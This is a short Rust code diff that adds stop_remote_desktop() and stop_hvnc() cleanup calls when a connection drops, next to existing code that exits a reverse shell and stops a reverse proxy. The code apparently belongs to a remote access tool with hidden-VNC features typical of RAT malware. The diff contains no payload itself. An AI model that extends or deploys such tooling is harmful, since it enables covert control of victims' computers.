@@ -136,6 +136,8 @@ pub async fn reading_loop(
                 println!("Connection error: {}", e);
                 reverse_shell_lock.send_shell_command(b"exit");
                 reverse_proxy.stop().await;
+                stop_remote_desktop();
+                stop_hvnc();
                 close_sender.send(()).unwrap_or_else(|_| println!("Failed to send close signal"));
                 break 'l;
             }
@@ -144,6 +146,8 @@ pub async fn reading_loop(
                 println!("Connection closed");
                 reverse_shell_lock.send_shell_command(b"exit");
                 reverse_proxy.stop().await;
+                stop_remote_desktop();
+                stop_hvnc();
                 close_sender.send(()).unwrap_or_else(|_| println!("Failed to send close signal"));
                 break 'l;
             }
